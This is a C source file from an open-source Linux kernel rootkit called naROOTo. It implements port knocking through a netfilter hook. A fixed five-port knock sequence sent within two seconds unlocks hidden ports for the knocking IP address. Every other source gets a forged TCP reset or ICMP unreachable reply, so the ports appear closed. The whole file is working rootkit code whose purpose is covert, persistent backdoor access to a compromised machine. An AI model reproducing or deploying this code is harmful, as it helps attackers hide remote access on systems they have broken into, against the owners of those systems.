/******************************************************************************
 *
 * Name: port_knocking.c 
 * This file provides all the functionality needed for port knocking.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/inet.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/time.h>
#include <net/icmp.h>
#include <net/ip.h>
#include <net/netfilter/ipv4/nf_reject.h>

#include "include.h"
#include "port_knocking.h"

/* information for netfilter hooks */
static struct nf_hook_ops hook;

/* port triggering setup */
static unsigned int tcp_state = 0;
static unsigned int udp_state = 0;
static unsigned short port_order[5] = {12345, 666, 23, 1337, 42};
static struct timespec tcp_time;
static struct timespec udp_time;
static __u32 ipaddr;

/* 
 * This function does all the checking.
 * First it checks if the packet is on one of the blocked ports. If this is
 * the case, it further checks whether the packet received is from the allowed ip.
 * If this is the case (or it belongs to an unblocked port), then it returns
 * false (let through), otherwise it returns true (drop and reject).
 */
static int
is_port_blocked (struct sk_buff *skb) {
	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
	struct tcphdr *tcp_header;
	struct udphdr *udp_header;
	
	unsigned short port;
	

	/* check tree for TCP */
	if (ip_header->protocol == 6) {

		/* get the tcp header */
		tcp_header = (struct tcphdr *) skb_transport_header(skb);
		port = ntohs(tcp_header->dest);
		
		/* work the state machine */
		if(tcp_state < 5) {
			if(port_order[tcp_state] == port) {
				if(tcp_state == 0) {
					getnstimeofday(&tcp_time);
					tcp_state++;
				} else {
					struct timespec cur;
					getnstimeofday(&cur);
					
					if(cur.tv_sec - tcp_time.tv_sec > 2) {
						tcp_state = 0;
					} else {
						tcp_state++;
					}
				}
			}
			
			ROOTKIT_DEBUG("Packet detected on TCP Port %u. State is now %u.\n", port, tcp_state);
		}
		
		/* check if the port matches */
		if(is_knocked_tcp(port)) {
			ROOTKIT_DEBUG("Received packet on filtered tcp port %u from IP %pI4.\n",
				port, &ip_header->saddr);
			
			/* check if we are in the correct state */
			if(tcp_state == 5 || ip_header->saddr == ipaddr) {
				tcp_state = 0;	/* reset the state */
				ipaddr = ip_header->saddr;
				
				return 0;	/* allow it */

			} else {
				
				return 1;	/* reject it */

			}
			
		}
	}

	/* check tree for UDP */
	if (ip_header->protocol == 17) {

		/* get the udp header */
		udp_header = (struct udphdr *) skb_transport_header(skb);
		port = ntohs(udp_header->dest);
		
		/* work the state machine */
		if(udp_state < 5) {
			if(port_order[udp_state] == port) {
				if(udp_state == 0) {
					getnstimeofday(&udp_time);
					udp_state++;
				} else {
					struct timespec cur;
					getnstimeofday(&cur);
					
					if(cur.tv_sec - udp_time.tv_sec > 2) {
						udp_state = 0;
					} else {
						udp_state++;
					}
				}
			}
			
			ROOTKIT_DEBUG("Packet detected on UDP Port %u. State is now %u.\n", port, udp_state);
		}

		/* check if the port matches */
		if(is_knocked_udp(port)) {
			ROOTKIT_DEBUG("Received packet on filtered udp port %u from IP %pI4.\n",
				port, &ip_header->saddr);
			
			/* check if we are in the correct state */
			if(udp_state == 5 || ip_header->saddr == ipaddr) {
				udp_state = 0;	/* reset the state */
				ipaddr = ip_header->saddr;
				
				return 0;	/* allow it */

			} else {
				
				return 1;	/* reject it */

			}
			
		}
	}

	return 0;	/* allow it */
}

/* 
 * The Netfilter hook function.
 * It is of type nf_hookfn (see netfilter.h).
 *
 * 
 */
unsigned int
knocking_hook (const struct nf_hook_ops *ops,
	struct sk_buff *skb,
	const struct net_device *in,
	const struct net_device *out,
	int (*okfn)(struct sk_buff *))
{
	struct iphdr *ip_header;
	
	/* check if we need to block this packet */
	if(is_port_blocked(skb)) {
		ip_header = (struct iphdr *) skb_network_header(skb);

		/* 
		 * craft an appropriate REJECT response
		 */
		if(ip_header->protocol == 6) {	/* tcp */
			nf_send_reset(skb, ops->hooknum);	/* send TCP RST */
		}
		
		if(ip_header->protocol == 17) {	/* udp */
			nf_send_unreach(skb, 3);		/* send icmp port unreachable */
		}

		/* we can now safely drop the packet */
		ROOTKIT_DEBUG("Dropped a packet due to port knocking.\n");
		return NF_DROP;

	} else {

		/* let the packet through */
		return NF_ACCEPT;

	}

}

/* enable port knocking */
int
load_port_knocking (void)
{
	int ret;
	
	ROOTKIT_DEBUG("Starting to load the port knocking...\n");

	/* reset the states */
	tcp_state = udp_state = 0;
	ipaddr = 0;
	
	/* setup everything for the netfilter hook */
	hook.hook = knocking_hook;			/* our function */
	hook.hooknum = NF_INET_LOCAL_IN;	/* grab everything that comes in */
	hook.pf = PF_INET; 					/* we only care about ipv4 */
	hook.priority = NF_IP_PRI_FIRST;	/* respect my prioritah */

	/* actually do the hook */
	ret = nf_register_hook(&hook);

	if(ret < 0) {
		ROOTKIT_DEBUG("Error enabling port knocking. Return of nf_register_hook = %d\n", ret);
		return ret;
	}

	/* log our success */
	ROOTKIT_DEBUG("Done.\n");
	return 0;
}

/* disable port knocking */
void
unload_port_knocking (void)
{
	ROOTKIT_DEBUG("Starting to unload the port knocking...\n");

	/* unregister the netfilter hook */
	nf_unregister_hook(&hook);

	ROOTKIT_DEBUG("Done.\n");
}
